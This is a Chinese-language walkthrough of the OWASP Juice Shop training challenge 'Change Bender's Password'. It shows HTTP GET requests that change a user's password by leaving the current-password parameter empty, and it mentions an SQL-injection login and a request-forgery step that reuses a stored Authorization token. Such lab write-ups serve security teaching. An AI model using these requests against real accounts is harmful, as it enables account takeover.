---
title: Change Bender's Password
description: 对参数进行测试，修改移除，查看效果。检查应用程序使用使用除 Cookie 外的验证信息，此处使用 Authorization 头部
---

- 描述：在不使用 SQL 注入或忘记密码的情况下，将 Bender 的密码更改为 ```slurmCl4ssic``` 
- 由管理员页面或用户表，已知邮箱地址
    ```bender@juice-sh.op```

- 修改密码的请求为
    ```GET /rest/user/change-password?current=admin123&new=admin123&repeat=admin123 HTTP/1.1```
    - 对参数进行测试，移除参数 ```current``` 的值
        ```GET /rest/user/change-password?current=&new=admin123&repeat=admin123 HTTP/1.1```
        仍然可成功修改密码

- SQL 注入登录目标用户，移除当前密码参数值后修改密码
    ```GET /rest/user/change-password?current=&new=slurmCl4ssic&repeat=slurmCl4ssic HTTP/1.1```

- 示例解决方案中的额外内容：
    1. 将跨域请求伪造漏洞转为本站请求伪造
    2. 设置 GET URL
    3. 读取本地储存的 ```Authorization``` 设置为头部
    4. 进行执行密码修改